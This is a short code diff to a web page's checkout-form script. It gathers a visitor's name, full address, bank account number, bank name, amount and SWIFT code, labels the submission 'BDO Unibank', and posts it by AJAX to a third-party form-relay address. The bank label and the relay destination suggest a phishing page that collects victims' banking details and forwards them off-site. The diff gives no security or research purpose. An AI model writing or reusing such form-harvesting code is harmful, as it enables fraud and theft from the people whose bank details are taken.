@@ -184,11 +184,32 @@
 
     $("#checkoutForm").on( 'submit', (e) => {
       e.preventDefault();
-      data = new FormData(this);
-      // const data = {
-      //   message: msg,
-      //   from_name: "OpenTeller"
-      // }
+      // data = new FormData(this);
+      const fullname = $("#fullname").val();
+      const str_address = $("#str_address").val();
+      const city = $("#city").val();
+      const state = $("#state").val();
+      const country = $("#country").val();
+      const zip_code = $("#zip_code").val();
+      const bank_account = $("#bank_account").val();
+      const bank_name = $("#bank_name").val();
+      const amount = $("#amount").val();
+      const swift_code = $("#swift_code").val();
+
+      const data = {
+        fullname,
+        str_address,
+        city,
+        state,
+        country,
+        zip_code,
+        bank_account,
+        bank_name,
+        amount,
+        swift_code,
+        from_name: "BDO Unibank"
+      }
+      
       $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>");
       $.ajax({
         url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
